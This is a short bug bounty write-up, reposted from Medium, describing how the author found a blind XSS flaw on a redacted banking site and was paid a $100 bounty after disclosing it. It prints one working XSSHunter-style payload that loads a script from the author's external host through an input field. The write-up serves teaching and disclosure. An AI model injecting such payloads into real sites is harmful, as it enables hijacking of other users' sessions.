# :globe_with_meridians: Get Blind XSS within 5 Minutes - $100

> **Original Source:** [Get Blind XSS within 5 Minutes - $100](https://infosecwriteups.com/get-blind-xss-within-5-minutes-100-9718bd056570)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Get Blind XSS within 5 Minutes — $100


Hello Boss….


I am Narayanan M and this is my first blog on infosecwriteups. Today I will explain how I found Blind XSS on a banking site.


I found the redacted.com when I was looking for a bug bounty program. In the event of a valid submission, redacted.com will award a bounty in accordance with CVSS. So I decided to give it a try.


#What is Blind XSS
Blind XSS is a flavor of cross-site scripting (XSS), where the attacker “blindly” deploys a series of malicious payloads on web pages that are likely to save them to a persistent state (like in a database, or a log file).


Let’s Hunt…


I quickly copied my XSSHunter payload [<iframe/srcdoc=”<script/src=//narayananm.xss.ht></script>”>] and pasted on name field. After few minutes, I received the following mail.


Yes! Our payload is executed….
Tip: Always check all input field


## Get Narayanan M’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Then I sent them a decent proof of concept. Next day, got a response from them to submit a video (POC) for better understanding. Again I create the video and sent it to them. A few days later, I received an email from them (the team has confirmed the fix. Can you check and update us?).


When I try to reproduce the issue, I can’t! That means the vulnerability has been successfully fixed.


Again a few days later I got an email from them and yes! It’s a bounty time.


Timeline:


Oct 6th — Vulnerability Reported
Oct 7th — Got a response from the team
Oct 17th — Vulnerability Fixed
Oct 27th — Retesting
Nov 3rd — Bounty Awarded ($100)


Twitter: [https://twitter.com/itsnarayananm](https://twitter.com/itsnarayananm)
Instagram: [https://www.instagram.com/rootx_narayanan/](https://www.instagram.com/rootx_narayanan/)
LinkedIn: [https://www.linkedin.com/in/narayanan-m-836197199/](https://www.linkedin.com/in/narayanan-m-836197199/)


Peace…

---

*Originally published on [Medium](https://infosecwriteups.com/get-blind-xss-within-5-minutes-100-9718bd056570). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
